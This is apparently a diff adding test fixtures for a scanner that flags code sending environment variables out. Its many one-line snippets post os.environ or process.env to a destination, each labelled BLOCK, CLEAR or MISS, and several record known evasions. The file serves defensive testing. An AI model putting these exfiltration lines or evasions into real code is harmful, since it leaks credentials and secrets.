+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "n = 8 // 2; requests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_lexical_comment_line_is_a_comment",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "// axios.post(destination, process.env)\nlet n = 1"
+ },
+ {
+  "label": "r2_lexical_comment_after_comma_inside_call",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "foo(a,\n // axios.post(destination, process.env)\n b)"
+ },
+ {
+  "label": "r2_lexical_trailing_comment_after_brace",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "if (ok) { run() } // axios.post(destination, process.env)"
+ },
+ {
+  "label": "r2_lexical_trailing_comment_after_semicolon",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "let n = 1; // fetch(destination, {body: JSON.stringify(process.env)})"
+ },
+ {
+  "label": "r2_lexical_division_after_a_closing_paren",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "let r = (a) / 2; axios.post(destination, process.env)"
+ },
+ {
+  "label": "r2_lexical_regex_after_return",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "function f() { return /axios.post(destination, process.env)/.test(\"x\"); }"
+ },
+ {
+  "label": "r2_lexical_regex_after_for_condition",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "for (;;) /axios.post(destination, process.env)/.test(\"x\");"
+ },
+ {
+  "label": "r2_lexical_division_then_call",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "let r = a / b; axios.post(destination, process.env)"
+ },
+ {
+  "label": "r2_projection_pairs_kept_whole",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "requests.post(destination, json=[(k, v) for k, v in os.environ.items()])"
+ },
+ {
+  "label": "r2_projection_names_of_the_items_view",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "requests.post(destination, json=[key for key, value in os.environ.items()])"
+ },
+ {
+  "label": "r2_projection_names_of_a_dict_comprehension",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "requests.post(destination, json={k: 1 for k in os.environ})"
+ },
+ {
+  "label": "r2_projection_values_of_a_dict_comprehension",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "requests.post(destination, json={k: v for k, v in os.environ.items()})"
+ },
+ {
+  "label": "r2_projection_body_is_the_environment",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "requests.post(destination, json={k: dict(os.environ) for k in names})"
+ },
+ {
+  "label": "r2_projection_indexed_environment_in_body",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "requests.post(destination, json=[os.environ[k] for k in names])"
+ },
+ {
+  "label": "r2_projection_second_of_each_pair",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "requests.post(destination, json=[value for key, value in os.environ.items()])"
+ },
+ {
+  "label": "r2_local_config_spread_before_the_url",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "axios({...base, url: \"http://localhost\", data: process.env})"
+ },
+ {
+  "label": "r2_local_config_spread_after_the_url",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "axios({url: \"http://localhost\", ...base, data: process.env})"
+ },
+ {
+  "label": "r2_local_config_final_url_wins",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "axios({url: \"http://localhost\", url: \"https://example.invalid\", data: process.env})"
+ },
+ {
+  "label": "r2_local_config_final_local_url_wins",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "axios({url: \"https://example.invalid\", url: \"http://localhost\", data: process.env})"
+ },
+ {
+  "label": "r2_computed_key_headers",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "fetch(destination, {[\"headers\"]: process.env})"
+ },
+ {
+  "label": "r2_computed_key_not_a_literal",
+  "family": "review_round_2",
+  "expect": "MISS",
+  "text": "fetch(destination, {[field]: JSON.stringify(process.env)})"
+ },
+ {
+  "label": "r2_computed_key_unused_field",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "fetch(destination, {[\"json\"]: JSON.stringify(process.env)})"
+ },
+ {
+  "label": "r2_owner_after_a_foreign_object",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "fetch(destination, {body: JSON.stringify(other.process.env)})"
+ },
+ {
+  "label": "r2_owner_after_one_global",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "fetch(destination, {body: JSON.stringify(globalThis.process.env)})"
+ },
+ {
+  "label": "r2_owner_after_a_global_of_another_object",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "fetch(destination, {body: JSON.stringify(window.other.process.env)})"
+ },
+ {
+  "label": "r2_owner_after_a_call_result",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "requests.post(destination, json=load().os.environ)"
+ },
+ {
+  "label": "r2_lexical_floor_division_after_a_backslash",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "n = 8 \\\n // 2; requests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_one_line_with_body_holds_the_call",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "with patch(\"requests.post\"): requests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_one_line_with_body_ends_with_the_line",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "with patch(\"requests.post\"): pass\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_stop_inside_a_with_block_leaves_the_block_double",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "with patch(\"requests.post\"):\n    p = patch(\"requests.post\")\n    p.start()\n    p.stop()\n    requests.post(destination, json=os.environ)\n"
+ },
+ {
+  "label": "r2_mock_start_before_the_patch_is_built",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "p = 1\np.start()\np = patch(\"requests.post\")\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_whitespace_dot_touching_the_name",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "requests .post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_whitespace_dot_touching_the_receiver",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "requests. post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_whitespace_chain_continued_on_the_next_line",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "axios\n  .post(destination, process.env)"
+ },
+ {
+  "label": "r2_whitespace_spaced_dot_and_spaced_name",
+  "family": "review_round_2",
+  "expect": "MISS",
+  "text": "axios . post(destination, process.env)"
+ }
+]
